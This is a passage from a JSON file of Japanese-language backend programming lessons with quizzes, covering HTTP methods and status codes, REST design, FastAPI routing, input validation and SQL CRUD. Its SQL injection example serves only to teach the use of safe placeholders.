      [
       {
        "question": "`https://shop.example.com/items/7?color=red#reviews` のうち、サーバーに送られないのは？",
        "choices": [
         "/items/7",
         "color=red",
         "#reviews"
        ],
        "answer": 2,
        "explain": "フラグメント（# 以降）はブラウザの中だけで使われます。"
       },
       {
        "question": "DNS の役割は？",
        "choices": [
         "ドメイン名を IP アドレスに変換する",
         "通信を暗号化する",
         "データを保存する"
        ],
        "answer": 0,
        "explain": "インターネットの電話帳のような仕組みです。"
       },
       {
        "question": "友達のパソコンから `http://localhost:8000` を開くと？",
        "choices": [
         "あなたのパソコンのサーバーが見える",
         "友達のパソコン自身の 8000 番ポートにつながる"
        ],
        "answer": 1,
        "explain": "localhost は「そのパソコン自身」を指します。"
       }
      ]
     ],
     "id": "02-url-dns-ip"
    },
    {
     "title": "HTTP のリクエストとレスポンス",
     "level": 1,
     "minutes": 18,
     "concepts": [
      "http_api",
      "backend"
     ],
     "summary": "メソッド・ステータスコード・ヘッダー・ボディ。バックエンドの会話の文法。",
     "body": "## このレッスンのゴール\n\n- HTTP のリクエストとレスポンスの中身を読める\n- GET・POST・PUT・PATCH・DELETE の使い分けを説明できる\n- ステータスコードを見て、何が起きたか分かる\n\n## HTTP は「手紙のやりとり」\n\nブラウザ（クライアント）がサーバーに **リクエスト** という手紙を送り、サーバーが **レスポンス** という返事を送ります。中身はただの文字です。\n\n**リクエスト**\n\n```http\nPOST /tasks HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\nAuthorization: Bearer eyJhbGciOi...\n\n{\"title\": \"会場を探す\", \"due\": \"2027-01-10\"}\n```\n\n**レスポンス**\n\n```http\nHTTP/1.1 201 Created\nContent-Type: application/json\n\n{\"id\": 42, \"title\": \"会場を探す\", \"due\": \"2027-01-10\", \"status\": \"todo\"}\n```\n\n| 部分 | リクエスト | レスポンス |\n|---|---|---|\n| 1 行目 | **メソッド** と パス（何をしたいか） | **ステータスコード**（結果） |\n| ヘッダー | 付属情報（送る形式・名札など） | 付属情報（返す形式・キャッシュの指示など） |\n| 空行のあと＝ボディ | 送るデータ（JSON など） | 返すデータ |\n\n## メソッド：何をしたいか\n\n| メソッド | 意味 | 例 | ボディ |\n|---|---|---|---|\n| **GET** | 取得する | タスク一覧を見る | なし |\n| **POST** | 新しく作る | タスクを追加する | あり |\n| **PUT** | 丸ごと置き換える | タスクの全項目を更新 | あり |\n| **PATCH** | 一部だけ変える | タスクの状態だけ「完了」に | あり |\n| **DELETE** | 削除する | タスクを消す | 普通はなし |\n\n大事な性質が 2 つあります。\n\n- **GET はデータを変えてはいけない**：ブラウザや検索エンジンは GET のリンクを自由にたどるので、`GET /tasks/42/delete` のような作りにすると、勝手に消されることがある\n- **同じことを何回しても結果が同じ（べき等）**：GET・PUT・DELETE はべき等。POST は 2 回送ると 2 件できてしまう。ボタンの二度押し対策が必要なのは主に POST\n\n## ステータスコード：結果の番号\n\n最初の数字で大まかな意味が分かります。\n\n| 番台 | 意味 | よく見るもの |\n|---|---|---|\n| **2xx 成功** | うまくいった | `200 OK`、`201 Created`（作成した）、`204 No Content`（成功・返すものなし） |\n| **3xx 転送** | 別の場所へ | `301`（引っ越した）、`302`（一時的に別の場所）、`304`（前と同じなのでキャッシュを使って） |\n| **4xx 利用者側の問題** | リクエストがおかしい | `400`（形が変）、`401`（ログインしていない）、`403`（権限がない）、`404`（無い）、`409`（衝突）、`422`（中身の検証で不合格）、`429`（多すぎ） |\n| **5xx サーバー側の問題** | サーバーが失敗した | `500`（中でエラー）、`502` / `503`（裏のサーバーが応答しない・混雑） |\n\n**401 と 403 の違い** はよく聞かれます。\n- `401 Unauthorized`：**あなたが誰か分からない**（ログインしていない・トークンが無効）\n- `403 Forbidden`：**誰かは分かったが、それをする権限がない**\n\n**4xx は「リクエストを直さないと何度やっても同じ」、5xx は「時間をおけば直るかもしれない」**。fashion_news の notion.py が 429 と 5xx だけをやり直していたのは、この違いを使っています。\n\n## ヘッダー：付属情報\n\n| ヘッダー | 意味 |\n|---|---|\n| `Content-Type: application/json` | ボディは JSON です |\n| `Authorization: Bearer xxx` | 私はこのトークンの持ち主です（認証） |\n| `Cookie` / `Set-Cookie` | ブラウザに覚えておいてもらう小さなデータ（ログイン状態など） |\n| `User-Agent` | 私はこういうプログラムです（fashion_news が名乗っていたもの） |\n| `Cache-Control` | このレスポンスをどれくらい使い回してよいか |\n| `Retry-After` | 何秒後にやり直せばよいか（429・503 と一緒に返る） |\n\n## HTTP は「覚えていない」\n\nHTTP は、**前のリクエストのことを覚えていません**（ステートレス）。1 通 1 通が独立した手紙です。\nだから「ログインしている」ことを伝えるには、**毎回のリクエストに Cookie やトークンを付けて名乗る** 必要があります（レッスン 9）。\n\n## 実際に見てみる\n\nブラウザで F12 →「ネットワーク」タブを開いてページを読み込むと、リクエストとレスポンスが 1 つずつ見られます。メソッド・ステータス・ヘッダーが、このレッスンの表のとおりに並んでいます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "タスクの状態だけを「完了」に変えるのに最も合うメソッドは？",
        "choices": [
         "GET",
         "POST",
         "PATCH"
        ],
        "answer": 2,
        "explain": "一部だけ変えるのは PATCH、丸ごと置き換えるのは PUT です。"
       },
       {
        "question": "ログインせずに管理画面の API を呼んだときに返るべきステータスは？",
        "choices": [
         "401",
         "403",
         "500"
        ],
        "answer": 0,
        "explain": "誰か分からないなら 401、誰か分かったうえで権限が無いなら 403 です。"
       },
       {
        "question": "500 が返ってきた。まず疑うのは？",
        "choices": [
         "送ったデータの形が間違っている",
         "サーバー側のプログラムでエラーが起きている",
         "URL が存在しない"
        ],
        "answer": 1,
        "explain": "5xx はサーバー側の問題。ログを見て原因を探します。"
       },
       {
        "question": "POST を 2 回送ってしまうと、何が起きやすい？",
        "choices": [
         "同じデータが 2 件作られる",
         "2 回目は自動で無視される",
         "サーバーが止まる"
        ],
        "answer": 0,
        "explain": "POST はべき等ではないので、二度押し対策が必要です。"
       }
      ]
     ],
     "id": "03-http"
    },
    {
     "title": "API と REST ― エンドポイントの設計",
     "level": 1,
     "minutes": 15,
     "concepts": [
      "http_api",
      "backend",
      "data_formats"
     ],
     "summary": "リソースと URL の決め方、JSON の返し方、API 設計のよくある約束ごと。",
     "body": "## このレッスンのゴール\n\n- API と REST が何か説明できる\n- 「名詞の URL ＋ 動詞のメソッド」で API を読める・設計できる\n- 一覧・ページ分け・エラーの返し方の定番を知る\n\n## API ＝ プログラム用の窓口\n\n**API**（Application Programming Interface）は、プログラムが別のプログラムに頼みごとをするための **窓口の約束ごと** です。\nWeb の世界では「この URL にこのメソッドでリクエストすると、こういう JSON が返ってくる」という約束を指すことがほとんどです。\n\npopup2027 の画面と Firebase、fashion_news と Notion の間でやりとりしていたのも API です。\n\n## REST：URL は名詞、メソッドは動詞\n\nREST は API の作り方の考え方（スタイル）です。一番大事なルールは、**URL で「何を（リソース）」、メソッドで「どうする」を表す** ことです。\n\n| やりたいこと | REST らしい | REST らしくない |\n|---|---|---|\n| タスク一覧を見る | `GET /tasks` | `GET /getTasks` |\n| タスクを 1 件見る | `GET /tasks/42` | `GET /task?id=42&action=show` |\n| タスクを作る | `POST /tasks` | `POST /createTask` |\n| タスクを変える | `PATCH /tasks/42` | `POST /tasks/42/update` |\n| タスクを消す | `DELETE /tasks/42` | `GET /tasks/42/delete` |\n| あるチームのタスク | `GET /teams/3/tasks` | `GET /tasks?team=3`（これも可） |\n\n- リソースは **複数形の名詞**（`/tasks`、`/users`）\n- 1 件は **ID** で指す（`/tasks/42`）\n- 親子関係はパスで表す（`/teams/3/tasks`）\n- 絞り込み・並べ替えはクエリで（`/tasks?status=done&sort=-due`）\n\n## CRUD との対応\n\nデータ操作の基本 4 つ（**C**reate 作成・**R**ead 読み取り・**U**pdate 更新・**D**elete 削除）は、ほぼそのまま REST に対応します。\n\n| CRUD | HTTP | SQL（レッスン 7） |\n|---|---|---|\n| Create | POST | INSERT |\n| Read | GET | SELECT |\n| Update | PUT / PATCH | UPDATE |\n| Delete | DELETE | DELETE |\n\n## 返す JSON の形\n\n```json\n{\n  \"id\": 42,\n  \"title\": \"会場を探す\",\n  \"status\": \"todo\",\n  \"due\": \"2027-01-10\",\n  \"assignee\": {\"id\": 1, \"name\": \"メンバーA\"},\n  \"created_at\": \"2026-11-21T09:30:00Z\"\n}\n```\n\nよくある約束ごと：\n\n- 日時は **ISO 8601**（`2026-11-21T09:30:00Z`）で、タイムゾーンを付ける（`Z` は UTC）\n- キーの名前は `snake_case` か `camelCase` に **そろえる**\n- お金は小数の誤差を避けるため、**円なら整数** で持つ\n\n## 一覧は「ページ分け」する\n\n1 万件のタスクを一度に返すと遅く、重くなります。一覧の API は一部ずつ返すのが普通です。\n\n```http\nGET /tasks?limit=20&offset=40      ← 41〜60 件目\nGET /tasks?limit=20&cursor=abc123  ← 「続きの目印」方式（Notion API と同じ）\n```\n\n```json\n{\n  \"items\": [ ... 20 件 ... ],\n  \"next_cursor\": \"def456\",\n  \"has_more\": true\n}\n```\n\nfashion_news の `find_child_page` が `has_more` と `next_cursor` を見てくり返し聞いていたのは、この **カーソル方式のページ分け** です。\n\n## エラーも決まった形で返す\n\n```http\nHTTP/1.1 422 Unprocessable Entity\n\n{\n  \"error\": {\n    \"code\": \"validation_error\",\n    \"message\": \"title は 1〜100 文字で入力してください\",\n    \"field\": \"title\"\n  }\n}\n```\n\n**ステータスコード ＋ 機械が読める code ＋ 人が読める message** の 3 点セットにしておくと、フロントエンドが「どの入力欄に赤字を出すか」を決めやすくなります。\n\n## バージョン\n\n```text\n/v1/tasks   ← 今の版\n/v2/tasks   ← 形を大きく変えた新しい版\n```\n\nAPI を使っている側がいるので、形を勝手に変えると相手のアプリが壊れます。大きく変えるときは新しい版を作るのが一般的です（Notion API の `Notion-Version` ヘッダーも同じ考え方）。\n\n## REST 以外の API\n\n| 種類 | 特徴 |\n|---|---|\n| **GraphQL** | 1 つの URL に「この項目がほしい」と問い合わせ文を送る。必要な分だけ取れる |\n| **gRPC** | サーバー同士の高速な通信向け。JSON ではなくバイナリ |\n| **WebSocket** | つなぎっぱなしで双方向にやりとり。チャットや popup2027 のようなリアルタイム更新向け |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "「id 7 のユーザーの注文一覧を取得する」REST らしい書き方は？",
        "choices": [
         "POST /getOrders?user=7",
         "GET /users/7/orders",
         "GET /orders/delete?user=7"
        ],
        "answer": 1,
        "explain": "URL は名詞（リソース）、操作はメソッドで表します。"
       },
       {
        "question": "タスクを削除する REST らしいリクエストは？",
        "choices": [
         "GET /tasks/42/delete",
         "DELETE /tasks/42",
         "POST /deleteTask"
        ],
        "answer": 1,
        "explain": "GET でデータを変えるのは避けます（勝手にたどられて消されることがある）。"
       },
       {
        "question": "一覧 API が `{\"items\": [...], \"has_more\": true, \"next_cursor\": \"x\"}` を返した。続きを取るには？",
        "choices": [
         "cursor=x を付けてもう一度リクエストする",
         "同じリクエストをもう一度送る",
         "items の最後の要素を削除する"
        ],
        "answer": 0,
        "explain": "カーソル方式のページ分けです。has_more が false になるまで続けます。"
       }
      ]
     ],
     "id": "04-rest-api"
    },
    {
     "title": "Web フレームワークとルーティング",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "backend",
      "http_api",
      "functions"
     ],
     "summary": "FastAPI で「この URL にこのメソッドが来たら、この関数」を書く。パスパラメータとクエリの受け取り方。",
     "body": "## このレッスンのゴール\n\n- フレームワークが何を肩代わりしてくれるか説明できる\n- `@app.get(\"/tasks/{task_id}\")` のようなルーティングを読める\n- パスパラメータ・クエリパラメータの違いが分かる\n\n## フレームワーク＝バックエンドの骨組みキット\n\nHTTP の手紙（レッスン 3）を自分で 1 文字ずつ読み解くのは大変です。**Web フレームワーク** は、\n「リクエストを受け取る」「URL ごとに関数を呼び分ける」「JSON にして返す」といった定番の作業を引き受けてくれます。\n私たちが書くのは **「この URL に来たら何をするか」** だけになります。\n\n## 最小の API（FastAPI）\n\n```python\nfrom fastapi import FastAPI, HTTPException\n\napp = FastAPI()\n\ntasks = {\n    1: {\"id\": 1, \"title\": \"会場を探す\", \"status\": \"todo\"},\n    2: {\"id\": 2, \"title\": \"チラシを作る\", \"status\": \"done\"},\n}\n\n@app.get(\"/tasks\")\ndef list_tasks(status: str | None = None):\n    items = list(tasks.values())\n    if status:\n        items = [t for t in items if t[\"status\"] == status]\n    return {\"items\": items}\n\n@app.get(\"/tasks/{task_id}\")\ndef get_task(task_id: int):\n    if task_id not in tasks:\n        raise HTTPException(status_code=404, detail=\"タスクが見つかりません\")\n    return tasks[task_id]\n```\n\n起動はターミナルでこう打ちます（ファイル名が `main.py` の場合）。\n\n```bash\nuvicorn main:app --reload\n```\n\n`main:app` は「main.py の中の app」、`--reload` は「ファイルを保存したら自動で再起動」です。\n`http://localhost:8000/tasks` を開くと JSON が表示され、`http://localhost:8000/docs` を開くと **API の説明書と試し打ちの画面が自動で** できています。\n\n## ルーティング：URL と関数の対応表\n\n```python\n@app.get(\"/tasks/{task_id}\")\ndef get_task(task_id: int):\n```\n\n`@app.get(...)` はデコレータ（Python コース Lv4）で、「GET で `/tasks/何か` が来たら、この関数を呼んで」と **登録** しています。\n\n| デコレータ | 対応するリクエスト |\n|---|---|\n| `@app.get(\"/tasks\")` | `GET /tasks` |\n| `@app.post(\"/tasks\")` | `POST /tasks` |\n| `@app.patch(\"/tasks/{task_id}\")` | `PATCH /tasks/42` |\n| `@app.delete(\"/tasks/{task_id}\")` | `DELETE /tasks/42` |\n\n**AI が書いたバックエンドを読むときは、まずこのデコレータを全部探す** と、その API で何ができるかの一覧がすぐ分かります。\n\n## パスパラメータとクエリパラメータ\n\n```text\nGET /tasks/2           → get_task(task_id=2)          パスの一部\nGET /tasks?status=done → list_tasks(status=\"done\")    ? のあと\n```\n\n| | パスパラメータ | クエリパラメータ |\n|---|---|---|\n| 書き方 | `/tasks/{task_id}` | `?status=done` |\n| 使いどころ | **どれか 1 つを指す**（ID） | **絞り込み・並べ替え・ページ分け** |\n| 省略 | できない | `= None` を付ければ省略できる |\n\nFastAPI は **関数の引数の名前と型ヒント** を見て、自動で値を取り出して変換してくれます。\n\n- `task_id: int` → `\"2\"` という文字を `2` という数値にしてから渡す\n- `/tasks/abc` のように数値にできないと、関数を呼ぶ前に **422 エラー** を自動で返す（実際に試して確認済み）\n- `status: str | None = None` → `?status=` が無ければ `None`\n\n## 何を返すとどうなる？\n\n| 関数の中で | レスポンス |\n|---|---|\n| `return {\"items\": [...]}`（辞書・リスト） | `200 OK` ＋ JSON |\n| `raise HTTPException(status_code=404, detail=\"...\")` | `404` ＋ `{\"detail\": \"タスクが見つかりません\"}` |\n| 想定外の例外（バグ） | `500 Internal Server Error` |\n| `@app.post(\"/tasks\", status_code=201)` と書いておく | 成功時に `201 Created` |\n\n`raise` で例外を投げると、そこで関数が止まり、フレームワークがエラーのレスポンスに変えてくれます（Python コース「例外処理」）。\n\n## JavaScript（Express）では\n\n```javascript\nimport express from \"express\";\nconst app = express();\n\napp.get(\"/tasks/:taskId\", (req, res) => {\n  const task = tasks[Number(req.params.taskId)];\n  if (!task) return res.status(404).json({ detail: \"タスクが見つかりません\" });\n  res.json(task);\n});\n\napp.listen(8000);\n```\n\n| FastAPI（Python） | Express（JavaScript） |\n|---|---|\n| `@app.get(\"/tasks/{task_id}\")` | `app.get(\"/tasks/:taskId\", ...)` |\n| 引数 `task_id: int` に自動で入る | `req.params.taskId`（文字列。自分で `Number()` に） |\n| 引数 `status` に自動で入る | `req.query.status` |\n| `return 辞書` | `res.json(オブジェクト)` |\n| `raise HTTPException(404, ...)` | `res.status(404).json(...)` |\n\n書き方は違っても、**「メソッド ＋ パス → 関数」の対応表を作る** という考え方は同じです。\n\n## AI のコードではこう出てくる\n\n```python\nrouter = APIRouter(prefix=\"/tasks\", tags=[\"tasks\"])\n\n@router.get(\"/{task_id}\")\ndef get_task(task_id: int): ...\n\napp.include_router(router)\n```\n\n大きなアプリでは、URL のグループ（`/tasks`・`/users` …）ごとにファイルを分け、`APIRouter` でまとめてから `app` に取り付けます。Express の `express.Router()` も同じ考え方です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`@app.delete(\"/tasks/{task_id}\")` が付いた関数が呼ばれるのは？",
        "choices": [
         "GET /tasks/5",
         "DELETE /tasks/5",
         "DELETE /tasks?task_id=5"
        ],
        "answer": 1,
        "explain": "メソッドとパスの両方が一致したときに呼ばれます。"
       },
       {
        "question": "`def get_task(task_id: int)` に `GET /tasks/abc` が来ると？",
        "choices": [
         "task_id に \"abc\" が入る",
         "関数が呼ばれる前に 422 エラーが返る",
         "500 エラーになる"
        ],
        "answer": 1,
        "explain": "型ヒントを見て変換できないと、FastAPI が自動で断ります。"
       },
       {
        "question": "「完了したタスクだけ」を絞り込む条件を渡すのに向いているのは？",
        "choices": [
         "パスパラメータ /tasks/done",
         "クエリパラメータ /tasks?status=done"
        ],
        "answer": 1,
        "explain": "絞り込みや並べ替えはクエリで渡すのが定番です。"
       }
      ]
     ],
     "id": "05-framework-routing"
    },
    {
     "title": "入力の検証（バリデーション）",
     "level": 2,
     "minutes": 15,
     "concepts": [
      "backend",
      "type_hints",
      "security",
      "errors"
     ],
     "summary": "届いたデータを信用せず、形と中身を確かめてから使う。Pydantic による自動チェックと 422 エラー。",
     "body": "## このレッスンのゴール\n\n- 「サーバーは届いたデータを信用しない」理由を説明できる\n- Pydantic のモデル（`BaseModel` と `Field`）を読める\n- 422 エラーの中身を読める\n\n## 届くデータは何でもあり\n\nフロントエンドの画面からは、決まった形のデータしか送られない…とは限りません。\n利用者は開発者ツールや別のプログラムを使って、**どんな JSON でも送れます**。\n\n```json\n{\"title\": \"\", \"due\": \"来週\", \"status\": \"完了したことにしておいて\"}\n```\n\nこれをそのまま保存すると、空のタスク・読めない日付・存在しない状態がデータベースに入り、あとで画面やほかの処理が壊れます。\nだからバックエンドは、**使う前に必ず形と中身を確かめます**。これをバリデーション（検証）と呼びます。\n\n## Pydantic：データの「型紙」\n\n```python\nfrom datetime import date\nfrom typing import Literal\nfrom pydantic import BaseModel, Field\n\nclass TaskCreate(BaseModel):\n    title: str = Field(min_length=1, max_length=100)\n    due: date | None = None\n    status: Literal[\"todo\", \"doing\", \"done\"] = \"todo\"\n\n@app.post(\"/tasks\", status_code=201)\ndef create_task(body: TaskCreate):\n    new_id = max(tasks) + 1\n    task = {\"id\": new_id, **body.model_dump()}\n    tasks[new_id] = task\n    return task\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `class TaskCreate(BaseModel)` | 「タスク作成のときに受け付けるデータの形」の定義 |\n| `title: str = Field(min_length=1, max_length=100)` | 文字列で、1〜100 文字 |\n| `due: date \\| None = None` | 日付（`\"2027-01-10\"` の形）。省略してもよい |\n| `status: Literal[...]` | この 3 つのどれかだけ |\n| `body: TaskCreate` | 「リクエストのボディを TaskCreate の型紙に当てはめて」 |\n| `body.model_dump()` | 検証済みのデータを辞書にする |\n\n関数の中に来た時点で、**`body` は検証に合格したデータだけ** です。だから関数の中で「title は空じゃないか？」と書かなくて済みます。\ndataclass（Python コース Lv3）に似ていますが、Pydantic は **実際に中身を確かめて、合わなければ断る** のが違いです。\n\n## 不合格だと 422\n\n```http\nPOST /tasks\n{\"title\": \"\"}\n```\n\n```json\nHTTP/1.1 422 Unprocessable Entity\n\n{\n  \"detail\": [\n    {\n      \"type\": \"string_too_short\",\n      \"loc\": [\"body\", \"title\"],\n      \"msg\": \"String should have at least 1 character\",\n      \"input\": \"\",\n      \"ctx\": {\"min_length\": 1}\n    }\n  ]\n}\n```\n\n- `loc`：どこがダメか（ボディの title）\n- `type` / `msg`：どうダメか（短すぎる）\n\n`\"due\": \"来週\"` を送ると、`loc` が `[\"body\", \"due\"]` のエラーになります（実際に試して確認済み）。\nフロントエンドは `loc` を見て、該当する入力欄の下に赤字を出せます。\n\n## 変換もしてくれる\n\n```json\n{\"title\": \"看板を発注\", \"due\": \"2027-01-10\"}\n```\n\n文字列の `\"2027-01-10\"` は、Python の `date(2027, 1, 10)` に **変換されて** `body.due` に入ります。\n返すときは、また `\"2027-01-10\"` という文字列の JSON に戻されます。\n\n## 返す側にも型紙を使う\n\n```python\nclass UserOut(BaseModel):\n    id: int\n    name: str\n\n@app.get(\"/users/{user_id}\", response_model=UserOut)\ndef get_user(user_id: int):\n    return users[user_id]      # password_hash などが入っていても…\n```\n\n`response_model=UserOut` を付けると、**型紙に無い項目（パスワードのハッシュなど）は自動で取り除かれて** 返ります。\n「入ってくるもの」と「出ていくもの」の両方を型紙で決めておくのが、安全な API の基本です。\n\n## 検証の 3 段階\n\n| 段階 | 例 | どこで |\n|---|---|---|\n| ① 形 | title は文字列、due は日付 | Pydantic |\n| ② 範囲 | title は 1〜100 文字、status は 3 つのどれか | Pydantic（`Field`・`Literal`） |\n| ③ 業務のルール | 担当者はチームのメンバーか、締め切りは本番の日より前か | 関数の中で自分で書く（データベースを見る必要があることが多い） |\n\n③ で断るときは、`raise HTTPException(status_code=422, detail=\"...\")`（または 400・409）を使います。\n\n## JavaScript / TypeScript では\n\n```typescript\nimport { z } from \"zod\";\n\nconst TaskCreate = z.object({\n  title: z.string().min(1).max(100),\n  due: z.string().date().optional(),\n  status: z.enum([\"todo\", \"doing\", \"done\"]).default(\"todo\"),\n});\n\nconst body = TaskCreate.parse(req.body);   // 合わなければ例外\n```\n\nTypeScript コースで出てきた **zod** が、Pydantic とほぼ同じ役割です。TypeScript の型は実行時に消えてしまうので、外から届いたデータは zod で確かめます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "フロントエンドで入力チェックをしているのに、サーバーでも検証する理由は？",
        "choices": [
         "利用者は画面を通さず、どんなデータでも直接送れるから",
         "フロントエンドのチェックは遅いから",
         "二重にチェックすると速くなるから"
        ],
        "answer": 0,
        "explain": "サーバーは届いたデータを信用しない、が鉄則です。"
       },
       {
        "question": "`status: Literal[\"todo\", \"doing\", \"done\"]` に `\"完了\"` を送ると？",
        "choices": [
         "そのまま保存される",
         "422 エラーで断られる",
         "\"done\" に自動で直される"
        ],
        "answer": 1,
        "explain": "決められた 3 つ以外は検証で不合格になります。"
       },
       {
        "question": "`response_model=UserOut` を付ける主な目的は？",
        "choices": [
         "処理を速くするため",
         "返してはいけない項目（パスワードのハッシュなど）を自動で取り除くため",
         "入力を検証するため"
        ],
        "answer": 1,
        "explain": "出ていくデータの形も型紙で決めておくと、うっかり漏らす事故を防げます。"
       }
      ]
     ],
     "id": "06-validation"
    },
    {
     "title": "データベースの基本 ― SQL で CRUD",
     "level": 2,
     "minutes": 20,
     "concepts": [
      "database",
      "backend",
      "security"
     ],
     "summary": "テーブル・行・列の考え方と、SELECT・INSERT・UPDATE・DELETE。プレースホルダとトランザクション。",
     "body": "## このレッスンのゴール\n\n- テーブル・行・列・主キーを説明できる\n- SELECT / INSERT / UPDATE / DELETE の 4 つを読める\n- `?`（プレースホルダ）を使う理由と、トランザクションの意味が分かる\n\n## データベース＝鍵付きの巨大な表計算ソフト\n\nこれまでのレッスンでは、タスクを Python の辞書に入れていました。これだと **サーバーを再起動すると全部消えます**。\nデータを確実に残し、たくさんの人が同時に読み書きしても壊れないようにするのが **データベース** です。\n\n最もよく使われるのは **リレーショナルデータベース**（RDB）で、データを表の形で持ちます。\n\n`tasks` テーブル\n\n| id（主キー） | title | status | due |\n|---|---|---|---|\n| 1 | 会場を探す | todo | 2027-01-10 |\n| 2 | チラシを作る | done | NULL |\n\n| 用語 | 意味 |\n|---|---|\n| テーブル | 1 種類のデータの表（tasks・users …） |\n| 行（レコード） | 1 件のデータ |\n| 列（カラム） | 項目。列ごとに型が決まっている |\n| 主キー（PRIMARY KEY） | 行を 1 つに特定する番号。重複しない |\n| NULL | 値が無いこと（Python の None） |\n\n代表的な RDB：**PostgreSQL**（本番の定番）、**MySQL**、**SQLite**（1 ファイルで動く。Python に最初から入っている）。\n\n## SQL：データベースへの命令文\n\nPython の標準ライブラリ `sqlite3` で、実際に動かせます（このレッスンのコードはすべて実行して確認済み）。\n\n### テーブルを作る\n\n```python\nimport sqlite3\nconn = sqlite3.connect(\"app.db\")\n\nconn.execute(\"\"\"\nCREATE TABLE tasks (\n    id      INTEGER PRIMARY KEY AUTOINCREMENT,\n    title   TEXT    NOT NULL,\n    status  TEXT    NOT NULL DEFAULT 'todo',\n    due     TEXT\n)\"\"\")\n```\n\n`NOT NULL` は「空は許さない」、`DEFAULT 'todo'` は「省略したら todo」、`AUTOINCREMENT` は「id を自動で 1, 2, 3 … と振る」。\nバリデーション（レッスン 6）とは別に、**データベース自身にもルールを持たせる** のが安全です。\n\n### C：追加（INSERT）\n\n```python\ncur = conn.execute(\"INSERT INTO tasks (title, due) VALUES (?, ?)\", (\"会場を探す\", \"2027-01-10\"))\nprint(cur.lastrowid)   # 1 ← 振られた id\nconn.commit()\n```\n\n### R：取得（SELECT）\n\n```python\nrows = conn.execute(\n    \"SELECT id, title, status FROM tasks WHERE status = ? ORDER BY id\",\n    (\"todo\",),\n).fetchall()\n# [(1, '会場を探す', 'todo'), (2, 'チラシを作る', 'todo')]\n```\n\nSELECT は英語の文のように読めます。「tasks から、status が todo の行の、id・title・status を、id 順で選ぶ」。\n\n| 句 | 意味 | Python で言うと |\n|---|---|---|\n| `SELECT 列` | どの列を | `[(t[\"id\"], t[\"title\"]) for t in ...]` |\n| `FROM テーブル` | どの表から | `tasks` |\n| `WHERE 条件` | どの行を | `if t[\"status\"] == \"todo\"` |\n| `ORDER BY 列` | 並び順 | `sorted(..., key=...)` |\n| `LIMIT 20` | 何件まで | `[:20]` |\n\n### U：更新（UPDATE）と D：削除（DELETE）\n\n```python\nconn.execute(\"UPDATE tasks SET status = ? WHERE id = ?\", (\"done\", 1))\nconn.execute(\"DELETE FROM tasks WHERE id = ?\", (2,))\nconn.commit()\n```\n\n⚠️ **`WHERE` を書き忘れると、全部の行が変更・削除されます**。AI のコードでも人間のコードでも、UPDATE と DELETE を見たら必ず WHERE を確かめましょう。\n\n## `?`（プレースホルダ）を必ず使う\n\n```python\nname = \"x' OR '1'='1\"\n\n# ❌ 危険：文字列に直接埋め込む\nconn.execute(f\"SELECT title FROM tasks WHERE title = '{name}'\")\n# → SELECT title FROM tasks WHERE title = 'x' OR '1'='1'\n# → 「または 1=1（常に真）」になり、全件が返ってしまう\n\n# ⭕ 安全：? で値を別に渡す\nconn.execute(\"SELECT title FROM tasks WHERE title = ?\", (name,))\n# → 「x' OR '1'='1」という名前のタスクを探すだけ（0 件）\n```\n\n実際に試すと、危険な書き方では他人の「秘密のタスク」まで返ってきました。これが **SQL インジェクション** という、昔から最も多い攻撃の 1 つです（レッスン 11 で詳しく）。\n**SQL に f-string や `+` で値を埋め込んでいたら、AI のコードでも必ず直してもらいましょう。**\n\n## トランザクション：全部やるか、全部やらないか\n\n銀行の振り込みは「A の口座から引く」と「B の口座に足す」の 2 つで 1 セットです。片方だけ成功すると、お金が消えたり増えたりします。\n\n```python\ntry:\n    with conn:                     # トランザクションの開始\n        conn.execute(\"UPDATE accounts SET balance = balance - 1000 WHERE id = 1\")\n        conn.execute(\"UPDATE accounts SET balance = balance + 1000 WHERE id = 2\")\n    # ブロックを無事に抜けたら commit（確定）\nexcept Exception:\n    # 途中でエラーが起きたら rollback（全部なかったことに）\n    ...\n```\n\n`commit` で確定、`rollback` で取り消し。**途中で失敗したら全部なかったことになる** のがトランザクションです（途中で例外を起こして、変更が取り消されることを確認済み）。\n\n## SQL 以外のデータベース（NoSQL）\n\n| 種類 | 例 | 特徴 |\n|---|---|---|\n| ドキュメント型 | **Firestore**（popup2027）、MongoDB | JSON のような形で保存。表の形に縛られない |\n| キー・バリュー型 | Redis | 名前と値の組。とても速い。キャッシュによく使う（レッスン 14） |\n\n迷ったら、まずは PostgreSQL や SQLite のような RDB から、が一般的です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`DELETE FROM tasks` を実行すると？",
        "choices": [
         "何も起きない",
         "tasks テーブルの全部の行が消える",
         "tasks テーブル自体が消える"
        ],
        "answer": 1,
        "explain": "WHERE が無いので全行が対象です。テーブル自体を消すのは DROP TABLE です。"
       },
       {
        "question": "SQL に値を入れるとき `?` を使う一番の理由は？",
        "choices": [
         "SQL インジェクションを防ぐため",
         "SQL が短くなるから",
         "処理が速くなるから"
        ],
        "answer": 0,
        "explain": "値を命令文と分けて渡すので、値の中の記号が命令として解釈されません。"
       },
       {
        "question": "トランザクションの途中でエラーが起きたら？",
        "choices": [
         "成功した部分だけ保存される",
         "それまでの変更が全部取り消される（rollback）",
         "データベースが壊れる"
        ],
        "answer": 1,
        "explain": "全部やるか、全部やらないか、がトランザクションです。"
       }
      ]
     ],
     "id": "07-sql-crud"
    },
    {
     "title": "ORM とマイグレーション",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "database",
      "classes",
      "tooling"
     ],
     "summary": "SQL をクラスとメソッドで書ける ORM（SQLAlchemy）と、テーブルの変更を履歴として管理するマイグレーション。",
